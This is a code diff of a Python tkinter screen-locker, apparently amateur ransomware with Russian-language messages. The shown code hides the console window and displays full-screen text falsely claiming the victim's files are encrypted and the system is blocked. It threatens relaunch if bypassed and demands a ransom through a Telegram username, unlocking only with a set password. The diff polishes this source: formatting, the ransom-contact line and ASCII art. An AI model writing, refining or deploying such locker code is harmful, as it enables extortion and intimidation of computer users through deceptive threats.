@@ -42,7 +42,7 @@ ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 def check_input(event=None):
     user_input = entry1.get().strip() 
-    if user_input == f"{parol}":  
+    if user_input == parol:  
         messagebox.showinfo("Доступ разблокирован!", "Вы разблокировали доступ к системе! Нажмите ОК для закрытия блокировщика.\nПользуйтесь : )")
         root.destroy() 
     else:
@@ -64,7 +64,7 @@ button1 = tk.Button(root, text="подтвердить", command=check_input)
 
 label4 = tk.Label(
     root,
-    text="""
+    text=f"""
     упс! вы подверглись хакерской атаке и ваши файлы были зашифрованы!
     пока ваш компьютер находится в этом состоянии вы ничего не сможете сделать.
     Любая попытка обхода вируса карается повторным запуском вируса!""",
@@ -80,7 +80,7 @@ label5 = tk.Label(
     text=f"""
     для откупа вы можете связатся с нами
     писать нужно в социальную сеть telegram
-    юзернейм автора @{otkup}""",
+    юзернейм автора {otkup}""",
     foreground="white",        
     background="blue",  
     font=("Arial", 30),
@@ -97,26 +97,24 @@ error: 0x63836426
 Ecryptor started!""", foreground="white", background="blue", font=("Arial", 20))
 
 smert1 = tk.Label(root, text="""
-              a          a
-             aaa        aaa
-            aaaaaaaaaaaaaaaa
-           aaaaaaaaaaaaaaaaaa
-          aaaaafaaaaaaafaaaaaa
-          aaaaaaaaaaaaaaaaaaaa
-           aaaaaaaaaaaaaaaaaa
-            aaaaaaa  aaaaaaa
-             aaaaaaaaaaaaaa
-  a         aaaaaaaaaaaaaaaa
- aaa       aaaaaaaaaaaaaaaaaa
- aaa      aaaaaaaaaaaaaaaaaaaa
- aaa     aaaaaaaaaaaaaaaaaaaaaa
- aaa    aaaaaaaaaaaaaaaaaaaaaaaa
-  aaa   aaaaaaaaaaaaaaaaaaaaaaaa
-  aaa   aaaaaaaaaaaaaaaaaaaaaaaa
-  aaa    aaaaaaaaaaaaaaaaaaaaaa
-   aaa    aaaaaaaaaaaaaaaaaaaa
-    aaaaaaaaaaaaaaaaaaaaaaaaaa
-     aaaaaaaaaaaaaaaaaaaaaaaaa
+░░▄▄▄░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄▄▄░░
+░▄████▄░░░░░░░░░░░░░░░░░░░░░░░▄▄████▄░
+░██░▀▀███▄▄░▄▄▄████████▄▄▄░▄▄███▀░███░
+░██░░░░░▀███████▀████▀▀██████▀░░░░███░
+░██▄░░░░░░░░░▀█▀░███░░░██▀▀░░░░░░░██▀░
+░▀██▄▄░░░░░░░░░░░░▀░░░░▀░░░░░░░▄▄▄██░░
+░░▀██▀░░░░░░░░░░░░░░░░░░░░░░░░░▀███▀░░
+░░▄██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██▄░░
+░░████▀░░███░░░░░░░░░░░░░░███░░█████░░
+░░███▀░░░█████░░░░░░░░░░█████░░░▀███░░
+░░██░░░░░░▀▀▀▀░░░░░░░░░░▀▀▀▀░░░░░▀██░░
+▄▄███▄▄▄▄░░░░░░░░░░░░░░░░░░░░▄▄▄▄███▄▄
+░▄▄██▄▄░░░▄█░░░░▄▀▀▀▀▄░░░░█▄░░░▄███▄▄░
+▀░░▄████▀▀▀▀░░░░░▀▄▄▀░░░░░▀▀▀▀████▄░░▀
+░▄▀░░▀███▄▄░░░█▄▄█▀▀█▄▄▀░░░▄▄██▀░░░▀▄░
+░░░░░░░░▀███▄▄░░░░░░░░░░▄▄███▀░░░░░░░░
+░░░░░░░░░░▀▀████▄▄▄▄▄▄████▀▀░░░░░░░░░░
+░░░░░░░░░░░░░░▀▀▀▀▀▀▀▀▀▀░░░░░░░░░░░░░
 """, foreground="white", background="blue", font=("Arial", 20))
 
 label1 = tk.Label(root, text=f"ваш виндовс заблокирован {name}", foreground="white", background="blue", font=("Arial", 35))
